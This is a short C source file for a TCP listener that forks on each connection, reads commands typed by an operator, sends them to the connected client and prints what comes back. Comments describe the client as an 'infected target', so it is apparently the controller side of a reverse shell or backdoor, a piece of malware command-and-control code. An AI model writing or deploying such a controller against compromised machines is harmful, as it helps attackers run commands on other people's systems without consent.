#include <stdio.h>
#include <sys/socket.h> //For Sockets
#include <stdlib.h>
#include <netinet/in.h> //For the AF_INET (Address Family)
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

struct sockaddr_in serv; //Main socket variable
int fd; //socket identifier (file descripter)
int conn; //connection identifier (connection file descripter)
char message[100] = ""; //array to store messages
int valread;
char output[100] = ""; //array to gather output from infected target

int startserv(int port){
  
  serv.sin_family = AF_INET;
  serv.sin_port = htons(port); //Listening port definition
  serv.sin_addr.s_addr = INADDR_ANY;

  fd = socket(AF_INET, SOCK_STREAM, 0); //Creates socket and returns identifier to fd

  
  if(fd < 0){
    printf("Error"); //used to test if the socket is already in use
    exit(0);
  }


  bind(fd, (struct sockaddr *)&serv, sizeof(serv)); //Assigns address to the socket

  listen(fd, 5); //Listen for client connections. Maximum 5 connections

  printf("Listener started on port %i...\n", port);

  while(conn = accept(fd, (struct sockaddr *)NULL, NULL)) {
      int pid;
      if((pid = fork()) == 0){
        
        printf("Connection received. Starting session %i\n", conn);
    
        while(1){
        
          fgets(message, 100, stdin);
          fflush(stdout);
          send(conn, message, strlen(message), 0);
          valread = read(conn, output, 100);
          if(valread > 0){

            printf("%s\n", output);

          }
          strcpy(output, " ");
        }
        
      }
    }
  
   return 0;
}
